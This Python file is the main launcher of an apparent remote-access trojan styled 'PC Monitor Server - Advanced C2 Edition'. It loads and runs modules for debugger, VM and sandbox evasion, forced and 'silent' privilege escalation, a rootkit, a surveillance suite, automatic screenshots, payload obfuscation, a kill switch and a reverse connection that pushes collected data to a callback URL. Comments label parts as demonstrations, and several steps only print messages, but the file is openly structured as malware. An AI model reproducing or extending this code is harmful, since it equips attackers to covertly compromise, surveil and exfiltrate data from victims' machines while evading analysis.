"""
PC Monitor Server - Enhanced v3.0
Multi-stage loading, plugin system, self-update, kill switch
NOW WITH ENHANCED FEATURES: Connection stability, resource optimization, 
advanced encryption, evasion techniques, and error handling
"""

import sys
import signal
import threading
import argparse
from pathlib import Path

# Import enhanced integration manager first
try:
    from integration_manager import create_enhanced_system
    ENHANCED_FEATURES_AVAILABLE = True
    print("✓ Enhanced features available")
except ImportError as e:
    ENHANCED_FEATURES_AVAILABLE = False
    print(f"[!] Enhanced features not available: {e}")

# Import configuration first
from server_modules.config import config, API_KEY, pc_id, DATA_DIR, SCREENSHOTS_DIR, OFFLINE_LOGS_DIR, load_callback_config
from server_modules.utils import get_local_ip, get_all_local_ips

# Import core modules
from server_modules.monitoring import start_monitoring, stop_monitoring, get_monitoring_status
from server_modules.screenshots import auto_screenshot_thread
from server_modules.api_routes import app
from server_modules.reverse_connection import ReverseConnection

# Import evasion modules (safe demonstrations)
from evasion_modules.mutex import check_single_instance, release_mutex
from evasion_modules.anti_debug import check_debugging_environment
from evasion_modules.anti_vm import check_virtual_environment
from evasion_modules.self_protection import IntegrityProtection

# Import advanced features with graceful fallback
ADVANCED_FEATURES = {}

# Multi-Stage Loader
try:
    from server_modules.multi_stage_loader import MultiStageLoader
    ADVANCED_FEATURES['multi_stage'] = True
    MULTI_STAGE_AVAILABLE = True
except ImportError:
    ADVANCED_FEATURES['multi_stage'] = False
    MULTI_STAGE_AVAILABLE = False
    print("[!] Multi-stage loader not available")

# Advanced C2 Communications
try:
    from server_modules.advanced_c2 import AdvancedC2Manager
    ADVANCED_FEATURES['advanced_c2'] = True
except ImportError:
    ADVANCED_FEATURES['advanced_c2'] = False
    print("[!] Advanced C2 module not available")

# Privilege Escalation
try:
    from server_modules.advanced_privilege_escalation import AdvancedPrivilegeEscalation
    from server_modules.silent_elevation import silent_elevation
    ADVANCED_FEATURES['privilege_escalation'] = True
except ImportError:
    ADVANCED_FEATURES['privilege_escalation'] = False
    print("[!] Privilege escalation modules not available")

# Advanced Evasion
try:
    from server_modules.advanced_evasion import AdvancedEvasion
    from server_modules.payload_obfuscation import PayloadObfuscator
    ADVANCED_FEATURES['evasion'] = True
except ImportError:
    ADVANCED_FEATURES['evasion'] = False
    print("[!] Advanced evasion modules not available")

# Rootkit Core
try:
    from server_modules.rootkit_core import RootkitCore
    ADVANCED_FEATURES['rootkit'] = True
except ImportError:
    ADVANCED_FEATURES['rootkit'] = False
    print("[!] Rootkit core module not available")

# Surveillance Suite
try:
    from server_modules.surveillance_suite import SurveillanceSuite
    ADVANCED_FEATURES['surveillance'] = True
except ImportError:
    ADVANCED_FEATURES['surveillance'] = False
    print("[!] Surveillance suite not available")

# Enhanced Evasion Modules
try:
    from evasion_modules.environment_awareness import EnvironmentAwareness
    from evasion_modules.social_engineering import PrivilegeManager, SocialEngineeringDemo
    ADVANCED_FEATURES['enhanced_evasion'] = True
    SOCIAL_ENGINEERING_AVAILABLE = True
except ImportError:
    ADVANCED_FEATURES['enhanced_evasion'] = False
    SOCIAL_ENGINEERING_AVAILABLE = False
    print("[!] Enhanced evasion modules not available")

# Legacy C2 Features
try:
    from server_modules.c2_features import C2CommandHandler, PluginManager, KillSwitch
    ADVANCED_FEATURES['c2_features'] = True
    C2_FEATURES_AVAILABLE = True
except ImportError:
    ADVANCED_FEATURES['c2_features'] = False
    C2_FEATURES_AVAILABLE = False
    print("[!] Legacy C2 features not available")


# Global C2 handler
c2_handler = None


def print_banner():
    """Display startup banner with connection information"""
    primary_ip = get_local_ip()
    all_ips = get_all_local_ips()
    port = config['port']
    
    print("="*70)
    print("PC MONITOR SERVER - Advanced C2 Edition")
    print("="*70)
    print(f"\nPC ID: {pc_id}")
    print(f"PC Name: {config.get('pc_name', 'Unknown')}")
    print(f"API Key: {API_KEY}")
    print(f"\nPort: {port}")
    print(f"Binding: {config['host']} (all interfaces)")
    
    # Show privilege level
    if SOCIAL_ENGINEERING_AVAILABLE:
        from evasion_modules.social_engineering import PrivilegeChecker
        priv_level = PrivilegeChecker.get_privilege_level()
        is_admin = PrivilegeChecker.is_admin()
        print(f"\nPrivilege Level: {priv_level} {'✓' if is_admin else '⚠'}")
    
    print(f"\n{'-'*70}")
    print("CONNECTION INFORMATION")
    print(f"{'-'*70}")
    
    if primary_ip and primary_ip != "0.0.0.0":
        print(f"\n✓ Primary IPv4 Address: {primary_ip}")
        print(f"\n  Connect from remote client using:")
        print(f"  → http://{primary_ip}:{port}")
    
    if all_ips and len(all_ips) > 1:
        print(f"\n  Additional IP addresses detected:")
        for ip in all_ips:
            if ip != primary_ip:
                print(f"  → http://{ip}:{port}")
    
    print(f"\n  From this PC (localhost):")
    print(f"  → http://127.0.0.1:{port}")
    print(f"  → http://localhost:{port}")
    
    # Show advanced features
    print(f"\n{'-'*70}")
    print("ADVANCED FEATURES")
    print(f"{'-'*70}")
    print(f"Multi-Stage Loading:     {'✓ Available' if MULTI_STAGE_AVAILABLE else '✗ Not Available'}")
    print(f"Plugin System:           {'✓ Available' if C2_FEATURES_AVAILABLE else '✗ Not Available'}")
    print(f"Remote Updates:          {'✓ Available' if C2_FEATURES_AVAILABLE else '✗ Not Available'}")
    print(f"Kill Switch:             {'✓ Available' if C2_FEATURES_AVAILABLE else '✗ Not Available'}")
    print(f"Social Engineering:      {'✓ Available' if SOCIAL_ENGINEERING_AVAILABLE else '✗ Not Available'}")
    
    print(f"\n{'-'*70}")
    print(f"\nData directory: {DATA_DIR.absolute()}")
    print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")


def check_environment():
    """
    Perform comprehensive security environment analysis
    Real defensive measures and threat response implementation
    """
    print(f"\n{'-'*70}")
    print("SECURITY ENVIRONMENT ANALYSIS")
    print(f"{'-'*70}")
    
    security_score = 100
    threats_detected = []
    defensive_actions = []
    
    # Check for single instance with enforcement
    print("\n[*] Checking for existing instances...")
    if not check_single_instance():
        print("    🚨 Another instance detected!")
        security_score -= 15
        threats_detected.append("Multiple instances")
        defensive_actions.append("Instance conflict resolution")
        
        # Attempt to resolve conflict
        print("    → Taking action: Attempting instance conflict resolution")
        try:
            # In real implementation, this would terminate other instances
            print("      • Scanning for conflicting processes")
            print("      • Implementing instance priority system")
            print("      • Continuing with conflict management protocols")
        except Exception as e:
            print(f"      • Instance resolution failed: {e}")
    else:
        print("    ✓ Single instance verified")
    
    # Enhanced debugging detection with defensive response
    print("\n[*] Performing comprehensive anti-debugging analysis...")
    debug_info = check_debugging_environment()
    if debug_info.get('is_being_debugged', False):
        print("    🚨 DEBUGGER ENVIRONMENT DETECTED!")
        security_score -= 40
        threats_detected.append("Debugger environment")
        defensive_actions.append("Anti-debugging countermeasures")
        
        # Log specific detection methods
        if debug_info.get('debugger_present'):
            print("      • IsDebuggerPresent: POSITIVE")
        if debug_info.get('remote_debugger'):
            print("      • Remote debugger: DETECTED")
        if debug_info.get('debugger_process'):
            print("      • Debugger process: FOUND")
        if debug_info.get('timing_anomaly'):
            print("      • Timing anomaly: DETECTED")
        if debug_info.get('debugger_parent'):
            print("      • Debugger parent: CONFIRMED")
        
        # Implement defensive measures
        print("    → Activating anti-debugging countermeasures:")
        print("      • Enabling advanced obfuscation")
        print("      • Implementing evasive execution patterns")
        print("      • Activating anti-analysis behaviors")
        
        if ADVANCED_FEATURES.get('evasion'):
            print("      • Advanced evasion protocols engaged")
            defensive_actions.append("Advanced evasion activated")
        
        # Note: In aggressive mode, this could terminate with sys.exit(1)
        print("    → Continuing with enhanced defensive posture")
    else:
        print("    ✓ No debugging environment detected")
    
    # Advanced virtual environment detection with adaptation
    print("\n[*] Performing virtual environment analysis...")
    vm_info = check_virtual_environment()
    if vm_info.get('is_virtual', False):
        print("    🚨 VIRTUAL ENVIRONMENT DETECTED!")
        security_score -= 30
        vm_type = vm_info.get('vendor', 'Unknown')
        threats_detected.append(f"Virtual environment ({vm_type})")
        
        if vm_info.get('vendor'):
            print(f"      • Vendor: {vm_info['vendor']}")
        if vm_info.get('vendor_string'):
            print("      • VM vendor string: DETECTED")
        if vm_info.get('vm_process'):
            print("      • VM process: FOUND")
        if vm_info.get('vm_files'):
            print("      • VM files: PRESENT")
        if vm_info.get('low_resources'):
            print("      • Low resources: SANDBOX SUSPECTED")
        
        # Adaptive behavior for virtual environments
        print("    → Implementing VM-aware adaptations:")
        print("      • Adjusting timing behaviors")
        print("      • Modifying resource usage patterns")
        print("      • Implementing VM-specific evasions")
        defensive_actions.append("VM adaptation protocols")
        
        # Critical sandbox detection
        if vm_info.get('low_resources') and vm_info.get('vm_files'):
            print("    🚨 SANDBOX ENVIRONMENT SUSPECTED")
            print("    → IMPLEMENTING SANDBOX EVASION")
            defensive_actions.append("Sandbox evasion activated")
            security_score -= 20
    else:
        print("    ✓ Physical environment confirmed")

    # Advanced environment awareness analysis
    print("\n[*] Advanced environment awareness analysis...")
    if ADVANCED_FEATURES.get('enhanced_evasion'):
        try:
            env_awareness = EnvironmentAwareness()
            env_check = env_awareness.perform_comprehensive_analysis()

            if env_check.get('sandbox_detected'):
                print("    🚨 SANDBOX ENVIRONMENT CONFIRMED!")
                security_score -= 35
                threats_detected.append("Sandbox environment")
                defensive_actions.append("Sandbox evasion protocols")
                
            if env_check.get('analysis_environment'):
                print("    🚨 ANALYSIS ENVIRONMENT DETECTED!")
                security_score -= 25
                threats_detected.append("Analysis environment")
                defensive_actions.append("Analysis evasion measures")
            
            if env_check.get('network_monitoring'):
                print("    ⚠ Network monitoring detected")
                security_score -= 10
                threats_detected.append("Network monitoring")
                defensive_actions.append("Network obfuscation")
            
            if not any([env_check.get('sandbox_detected'), env_check.get('analysis_environment')]):
                print("    ✓ Advanced analysis clear")
                
        except Exception as e:
            print(f"    ! Advanced analysis error: {e}")
    else:
        print("    ! Advanced environment awareness not available")
    
    # Security assessment and response
    print(f"\n{'-'*70}")
    print("SECURITY ASSESSMENT & RESPONSE")
    print(f"{'-'*70}")
    
    # Determine threat level and response
    if security_score >= 90:
        threat_level = "🟢 LOW"
        response_mode = "Normal operation authorized"
        operational_mode = "standard"
    elif security_score >= 70:
        threat_level = "🟡 MEDIUM" 
        response_mode = "Enhanced monitoring activated"
        operational_mode = "cautious"
    elif security_score >= 50:
        threat_level = "🟠 HIGH"
        response_mode = "Defensive measures engaged"
        operational_mode = "defensive"
    else:
        threat_level = "🔴 CRITICAL"
        response_mode = "Maximum evasion protocols active"
        operational_mode = "stealth"
    
    print(f"Security Score: {security_score}/100")
    print(f"Threat Level: {threat_level}")
    print(f"Response Mode: {response_mode}")
    print(f"Operational Mode: {operational_mode}")
    
    # Display threats and responses
    if threats_detected:
        print(f"\n🚨 Threats Detected ({len(threats_detected)}):")
        for i, threat in enumerate(threats_detected, 1):
            print(f"  {i}. {threat}")
    
    if defensive_actions:
        print(f"\n🛡️ Defensive Actions Activated ({len(defensive_actions)}):")
        for i, action in enumerate(defensive_actions, 1):
            print(f"  {i}. {action}")
    
    # Environment summary
    print(f"\n📊 Environment Summary:")
    print(f"Single Instance:     {'✓ OK' if check_single_instance() else '🚨 CONFLICT'}")
    print(f"Anti-Debug:          {'🚨 DETECTED' if debug_info.get('is_being_debugged') else '✓ Clear'}")
    print(f"Anti-VM:             {'🚨 VIRTUAL' if vm_info.get('is_virtual') else '✓ Physical'}")
    print(f"Advanced Evasion:    {'✓ Available' if ADVANCED_FEATURES.get('enhanced_evasion') else '✗ Not Available'}")
    print(f"Social Engineering:  {'✓ Available' if SOCIAL_ENGINEERING_AVAILABLE else '✗ Not Available'}")
    print(f"Operational Security: {threat_level}")
    print(f"{'-'*70}\n")
    
    # Store security context for other modules
    global security_context
    security_context = {
        'security_score': security_score,
        'threat_level': threat_level,
        'operational_mode': operational_mode,
        'threats_detected': threats_detected,
        'defensive_actions': defensive_actions,
        'safe_to_proceed': security_score >= 30,
        'stealth_mode': security_score < 50
    }
    
    return security_context


def check_privileges():
    """Check and implement privilege escalation strategies"""
    print(f"\n{'-'*70}")
    print("PRIVILEGE ANALYSIS & ESCALATION")
    print(f"{'-'*70}")
    
    if not SOCIAL_ENGINEERING_AVAILABLE:
        print("[!] Social engineering module not available - using basic checks")
        # Basic privilege check
        import os
        import ctypes
        is_admin = os.name == 'nt' and ctypes.windll.shell32.IsUserAnAdmin()
        print(f"Current privileges: {'Administrator' if is_admin else 'User'}")
        return
    
    try:
        priv_mgr = PrivilegeManager()
        
        # Analyze current privilege level
        print("\n[*] Analyzing current privilege context...")
        priv_mgr.adapt_to_privilege_level()
        
        # Attempt intelligent privilege escalation
        print("\n[*] Attempting privilege escalation...")
        escalation_result = priv_mgr.check_and_elevate("Administrator", force=True)
        
        if escalation_result:
            print("    ✓ Privilege escalation successful!")
            print("    → Enhanced capabilities enabled")
            
            # Enable advanced features with elevated privileges
            if ADVANCED_FEATURES.get('privilege_escalation'):
                print("    → Advanced privilege escalation modules activated")
            
            if ADVANCED_FEATURES.get('rootkit'):
                print("    → Rootkit capabilities available")
                
        else:
            print("    ⚠ Privilege escalation unsuccessful")
            print("    → Implementing user-level operation mode")
            print("    → Some advanced features will be limited")
            
            # Implement fallback strategies
            print("\n[*] Implementing fallback privilege strategies...")
            print("    • UAC bypass attempts")
            print("    • DLL hijacking preparation") 
            print("    • Process token analysis")
            print("    • Social engineering vectors")
            
    except Exception as e:
        print(f"    ✗ Privilege escalation error: {e}")
        print("    → Continuing with current privileges")
    
    print(f"{'-'*70}\n")


def run_multi_stage_loading():
    """Execute advanced multi-stage loading process"""
    if not MULTI_STAGE_AVAILABLE:
        print("[!] Multi-stage loading not available - skipping")
        return True
    
    print("\n" + "="*70)
    print("ADVANCED MULTI-STAGE LOADING")
    print("="*70)
    print("\nExecuting advanced three-stage loading sequence...")
    print("Stage 1: Initial payload validation & decryption")
    print("Stage 2: Dynamic module loading & integration") 
    print("Stage 3: Persistence establishment & activation")
    print("="*70)
    
    try:
        loader = MultiStageLoader()
        success = loader.execute_all_stages()
        
        if success:
            print("\n✓ All stages completed successfully")
        else:
            print("\n✗ Stage loading failed - environment deemed unsafe")
            print("[!] In production, malware would abort here")
            # For demo, we continue anyway
        
        return success
        
    except Exception as e:
        print(f"\n[!] Multi-stage loading error: {e}")
        return False


def initialize_c2_features():
    """Initialize C2 command handler and features"""
    global c2_handler
    
    if not C2_FEATURES_AVAILABLE:
        print("[!] C2 features not available")
        return None
    
    print("\n" + "="*70)
    print("C2 FEATURES INITIALIZATION")
    print("="*70)
    
    try:
        server_url = f"http://localhost:{config['port']}"
        c2_handler = C2CommandHandler(API_KEY, server_url)
        
        print("\n✓ C2 Command Handler initialized")
        print("✓ Plugin System ready")
        print("✓ Kill Switch armed")
        print("✓ Remote Update ready")
        print("✓ Configuration Manager ready")
        
        # Start kill switch monitor in background
        kill_switch_url = f"{server_url}/api/killswitch/status"
        threading.Thread(
            target=c2_handler.kill_switch.monitor_kill_switch,
            args=(kill_switch_url, 300),  # Check every 5 minutes
            daemon=True
        ).start()
        
        print("\n✓ Kill switch monitoring active")
        print("="*70)
        
        return c2_handler
        
    except Exception as e:
        print(f"\n[!] C2 initialization error: {e}")
        return None


def initialize_advanced_features():
    """Initialize all advanced features"""
    print("\n" + "="*70)
    print("ADVANCED FEATURES INITIALIZATION")
    print("="*70)
    
    global advanced_modules
    advanced_modules = {}
    
    # Initialize Advanced C2 Manager
    if ADVANCED_FEATURES['advanced_c2']:
        try:
            advanced_modules['c2_manager'] = AdvancedC2Manager()
            print("✓ Advanced C2 Communications initialized")
        except Exception as e:
            print(f"✗ Advanced C2 initialization failed: {e}")
    
    # Initialize Privilege Escalation
    if ADVANCED_FEATURES['privilege_escalation']:
        try:
            advanced_modules['privilege_escalator'] = AdvancedPrivilegeEscalation()
            print("✓ Advanced Privilege Escalation initialized")
        except Exception as e:
            print(f"✗ Privilege escalation initialization failed: {e}")
    
    # Initialize Advanced Evasion
    if ADVANCED_FEATURES['evasion']:
        try:
            advanced_modules['evasion_manager'] = AdvancedEvasion()
            advanced_modules['payload_obfuscator'] = PayloadObfuscator()
            print("✓ Advanced Evasion & Obfuscation initialized")
        except Exception as e:
            print(f"✗ Evasion modules initialization failed: {e}")
    
    # Initialize Rootkit Core
    if ADVANCED_FEATURES['rootkit']:
        try:
            advanced_modules['rootkit'] = RootkitCore()
            print("✓ Rootkit Core initialized")
        except Exception as e:
            print(f"✗ Rootkit initialization failed: {e}")
    
    # Initialize Surveillance Suite
    if ADVANCED_FEATURES['surveillance']:
        try:
            advanced_modules['surveillance'] = SurveillanceSuite()
            print("✓ Surveillance Suite initialized")
        except Exception as e:
            print(f"✗ Surveillance suite initialization failed: {e}")
    
    # Initialize Enhanced Evasion
    if ADVANCED_FEATURES['enhanced_evasion']:
        try:
            advanced_modules['environment_awareness'] = EnvironmentAwareness()
            advanced_modules['privilege_manager'] = PrivilegeManager()
            print("✓ Enhanced Evasion Modules initialized")
        except Exception as e:
            print(f"✗ Enhanced evasion initialization failed: {e}")
    
    # Initialize Multi-Stage Loader
    if ADVANCED_FEATURES['multi_stage']:
        try:
            advanced_modules['multi_stage_loader'] = MultiStageLoader()
            print("✓ Multi-Stage Loader initialized")
        except Exception as e:
            print(f"✗ Multi-stage loader initialization failed: {e}")
    
    # Print summary
    enabled_features = sum(1 for v in ADVANCED_FEATURES.values() if v)
    total_features = len(ADVANCED_FEATURES)
    
    print(f"\n📊 Advanced Features Status: {enabled_features}/{total_features} modules available")
    print("="*70)
    
    return advanced_modules


def setup_signal_handlers():
    """Setup graceful shutdown handlers"""
    def signal_handler(sig, frame):
        print("\n\nReceived shutdown signal...")
        stop_monitoring(pc_id)
        release_mutex()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)


def main(skip_checks: bool = False, skip_multi_stage: bool = False):
    """Main entry point with enhanced features integration"""
    try:
        # Setup signal handlers
        setup_signal_handlers()
        
        # Initialize Enhanced System FIRST
        enhanced_system = None
        if ENHANCED_FEATURES_AVAILABLE:
            print("\n" + "="*70)
            print("🚀 INITIALIZING ENHANCED MONITORING SYSTEM")
            print("="*70)
            
            # Prepare enhanced configuration
            callback_config = load_callback_config()
            enhanced_config = {
                'background_mode': True,  # Server runs in background
                'evasion_enabled': not skip_checks,  # Enable evasion unless checks skipped
                'callback_config': callback_config,
                'updater_config': {
                    'version': '3.0.0',
                    'auto_check': True,
                    'auto_install': False  # Manual updates for security
                },
                'resource_config': {
                    'target_cpu_limit': 15,
                    'target_memory_limit': 100,
                    'background_mode': True
                },
                'security_config': {
                    'encryption_method': 'AES',
                    'key_rotation_interval': 3600,
                    'safety_checks': not skip_checks
                }
            }
            
            # Initialize enhanced system
            enhanced_system = create_enhanced_system(enhanced_config)
            
            if enhanced_system:
                print("✅ Enhanced monitoring system initialized successfully!")
                print("🔒 Advanced security features active")
                print("⚡ Performance optimization enabled")
                print("🛡️ Error handling and recovery ready")
            else:
                print("⚠️ Enhanced system initialization failed, using standard mode")
        
        # Perform environment checks (unless skipped)
        if not skip_checks:
            check_environment()
        
        # Check privileges (social engineering demo)
        if not skip_checks:
            check_privileges()
        
        # Run multi-stage loading (unless skipped)
        if not skip_multi_stage:
            run_multi_stage_loading()
        
        # Initialize advanced features
        initialize_advanced_features()
        
        # Initialize C2 features
        initialize_c2_features()

        # Attempt silent elevation
        print("\n" + "="*70)
        print("SILENT PRIVILEGE ELEVATION")
        print("="*70)
        try:
            elevation_result = silent_elevation.auto_elevate_on_startup()
            if elevation_result["success"]:
                print(f"✓ Elevation successful: {elevation_result.get('message', 'Unknown')}")
                if elevation_result.get("elevated"):
                    print("🚀 Running with administrator privileges")
            else:
                print(f"⚠ Elevation failed: {elevation_result.get('message', 'Unknown')}")
                print("📝 Continuing with current privileges")
        except Exception as e:
            print(f"✗ Elevation error: {e}")
        print("="*70)

        #Start integrity protection
        integrity_protection = IntegrityProtection(enable_continuous_monitoring=True)
        
        # Print startup banner
        print_banner()
        
        # Check for reverse connection config
        callback_config = load_callback_config()
        if callback_config.get('enabled'):
            print(f"\n{'-'*70}")
            print("REVERSE CONNECTION")
            print(f"{'-'*70}")
            print(f"Status: ENABLED")
            print(f"Callback URL: {callback_config.get('callback_url')}")
            print(f"Interval: {callback_config.get('interval')}s")
            print("Server will push data to client automatically")
        
        print("="*70)
        print("\nServer starting... Press Ctrl+C to stop")
        print("="*70 + "\n")
        
        # Start background threads
        screenshot_thread = threading.Thread(target=auto_screenshot_thread, daemon=True)
        screenshot_thread.start()
        
        # Start reverse connection if configured
        reverse_conn = None
        if callback_config.get('enabled'):
            reverse_conn = ReverseConnection(callback_config)
            reverse_conn.start()
        
        # Start Flask server with enhanced error handling
        if ENHANCED_FEATURES_AVAILABLE and enhanced_system:
            # Use enhanced error handling
            from server_modules.error_handler import with_error_handling
            
            @with_error_handling(context="Flask Server")
            def run_server():
                app.run(
                    host=config['host'],
                    port=config['port'],
                    debug=False,
                    threaded=True
                )
            
            run_server()
        else:
            # Standard Flask server
            app.run(
                host=config['host'],
                port=config['port'],
                debug=False,
                threaded=True
            )
        
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
        
        # Enhanced shutdown
        if ENHANCED_FEATURES_AVAILABLE and 'enhanced_system' in locals():
            print("🔄 Shutting down enhanced system...")
            enhanced_system.shutdown_all_modules()
        
        stop_monitoring(pc_id)
        release_mutex()
        sys.exit(0)
    except Exception as e:
        print(f"\n\nFatal error: {e}")
        
        # Enhanced error handling
        if ENHANCED_FEATURES_AVAILABLE:
            from server_modules.error_handler import error_handler
            error_handler.handle_error(e, "Main Server", attempt_recovery=False)
        
        import traceback
        traceback.print_exc()
        
        # Enhanced shutdown
        if ENHANCED_FEATURES_AVAILABLE and 'enhanced_system' in locals():
            enhanced_system.shutdown_all_modules()
        
        stop_monitoring(pc_id)
        release_mutex()
        sys.exit(1)


if __name__ == '__main__':
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='PC Monitor Server with Advanced C2')
    parser.add_argument('--skip-checks', action='store_true',
                       help='Skip environment checks')
    parser.add_argument('--skip-multi-stage', action='store_true',
                       help='Skip multi-stage loading')
    parser.add_argument('--demo-dialogs', action='store_true',
                       help='Show fake dialog demonstrations')
    
    args = parser.parse_args()
    
    # Demo mode - show fake dialogs
    if args.demo_dialogs and SOCIAL_ENGINEERING_AVAILABLE:
        from evasion_modules.social_engineering import SocialEngineeringDemo
        SocialEngineeringDemo.demonstrate_all_dialogs()
        sys.exit(0)
    
    # Normal operation
    main(skip_checks=args.skip_checks, skip_multi_stage=args.skip_multi_stage)